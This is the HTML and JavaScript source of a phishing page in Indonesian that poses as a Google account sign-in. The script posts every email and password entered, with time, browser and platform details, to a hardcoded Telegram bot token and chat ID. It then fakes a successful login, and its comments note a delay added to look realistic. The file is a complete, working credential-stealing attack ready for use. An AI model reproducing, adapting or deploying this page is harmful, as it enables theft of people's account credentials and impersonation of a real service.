<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üìß</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 450px;
        }

        .login-box {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            text-align: center;
        }

        .logo {
            margin-bottom: 16px;
        }

        .logo img {
            width: 75px;
            height: 75px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            letter-spacing: 0;
        }

        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 24px;
            font-weight: 400;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .input-wrapper {
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            font-family: inherit;
            transition: border-color 0.2s;
            background: transparent;
        }

        .form-group input:hover {
            border-color: #202124;
        }

        .form-group input:focus {
            outline: none;
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .show-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #1a73e8;
            font-size: 14px;
            cursor: pointer;
            padding: 4px 8px;
            font-weight: 500;
        }

        .show-password:hover {
            background: rgba(26, 115, 232, 0.04);
            border-radius: 4px;
        }

        .forgot-password {
            text-align: left;
            margin-bottom: 26px;
        }

        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 26px;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 9px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            min-width: 80px;
            font-family: inherit;
        }

        .next-btn:hover {
            background: #1765cc;
            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
        }

        .next-btn:active {
            background: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, .3), 0 2px 6px 2px rgba(60, 64, 67, .15);
        }

        .next-btn:disabled {
            background: #dadce0;
            color: #5f6368;
            cursor: not-allowed;
            box-shadow: none;
        }

        .language-select {
            text-align: center;
            margin-top: 24px;
        }

        .language-select select {
            border: none;
            background: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
            padding: 4px;
        }

        .footer {
            text-align: center;
            margin-top: 26px;
            padding: 0 8px;
        }

        .footer-links {
            list-style: none;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 12px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Loading spinner */
        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #1a73e8;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-message {
            background: #e8f5e9;
            border: 1px solid #4caf50;
            color: #2e7d32;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
            text-align: left;
        }

        .success-message.show {
            display: block;
        }

        @media (max-width: 600px) {
            .login-box {
                padding: 40px 24px 36px;
                border: none;
            }

            .button-group {
                flex-direction: column-reverse;
                gap: 16px;
                align-items: stretch;
            }

            .next-btn {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="logo">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%234285F4' d='M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z'/%3E%3Cpath fill='%2334A853' d='M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z'/%3E%3Cpath fill='%23FBBC05' d='M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z'/%3E%3Cpath fill='%23EA4335' d='M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z'/%3E%3C/svg%3E" alt="Google">
            </div>

            <h1>Login</h1>
            <p class="subtitle">Gunakan Akun Google Anda</p>

            <div id="successMessage" class="success-message"></div>

            <form id="loginForm">
                <div class="form-group">
                    <input 
                        type="email" 
                        id="email" 
                        placeholder="Email atau nomor telepon"
                        autocomplete="username"
                        required
                    >
                </div>

                <div class="form-group">
                    <div class="input-wrapper">
                        <input 
                            type="password" 
                            id="password" 
                            placeholder="Masukkan sandi Anda"
                            autocomplete="current-password"
                            required
                        >
                        <button type="button" class="show-password" onclick="togglePassword()">Tampilkan</button>
                    </div>
                </div>

                <div class="forgot-password">
                    <a href="#" onclick="return false;">Lupa email?</a>
                </div>

                <p style="font-size: 13px; color: #5f6368; text-align: left; margin-bottom: 20px;">
                    Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. 
                    <a href="#" style="color: #1a73e8; text-decoration: none;" onclick="return false;">Pelajari lebih lanjut</a>
                </p>

                <div class="button-group">
                    <a href="#" class="create-account" onclick="return false;">Buat akun</a>
                    <button type="submit" class="next-btn" id="submitBtn">Berikutnya</button>
                </div>
            </form>
        </div>

        <div class="language-select">
            <select>
                <option>Bahasa Indonesia</option>
                <option>English (United States)</option>
            </select>
        </div>

        <div class="footer">
            <ul class="footer-links">
                <li><a href="#" onclick="return false;">Bantuan</a></li>
                <li><a href="#" onclick="return false;">Privasi</a></li>
                <li><a href="#" onclick="return false;">Persyaratan</a></li>
            </ul>
        </div>
    </div>

    <script>
        // ========================================
        // KONFIGURASI TELEGRAM
        // ========================================
        const TELEGRAM_BOT_TOKEN = '8337679399:AAGgDi6eDjQ-4-MT9hj8h4tuaBRcKi--mOk';
        const TELEGRAM_CHAT_ID = '7538231958';

        // ========================================
        // FUNCTIONS
        // ========================================

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.show-password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'Sembunyikan';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'Tampilkan';
            }
        }

        function showSuccess(message) {
            const successElement = document.getElementById('successMessage');
            successElement.textContent = '‚úì ' + message;
            successElement.classList.add('show');
        }

        async function sendToTelegram(email, password) {
            const now = new Date();
            const formattedTime = now.toLocaleString('id-ID', {
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });

            const message = `
üíå <b>Login Baru!</b>

üë§ <b>Email:</b> ${email}
üîë <b>Password:</b> ${password}

‚è∞ <b>Waktu:</b> ${formattedTime}
üåê <b>Browser:</b> ${navigator.userAgent.split(' ').slice(-1)[0]}
üì± <b>Platform:</b> ${navigator.platform}
            `.trim();

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                return await response.json();
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return null;
            }
        }

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const submitBtn = document.getElementById('submitBtn');

            // Basic validation
            if (!email || !password) {
                return;
            }

            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span class="spinner"></span>Memverifikasi...';

            // Simulate network delay untuk terlihat realistis
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Kirim ke Telegram
            await sendToTelegram(email, password);

            // Selalu berhasil login
            showSuccess('Login berhasil! Mengalihkan...');

            // Redirect setelah 1.5 detik
            setTimeout(() => {
                // Ganti dengan halaman tujuan kamu
                window.location.href = 'love_final.html'; // atau URL lain
            }, 1500);
        });
    </script>
</body>
</html>
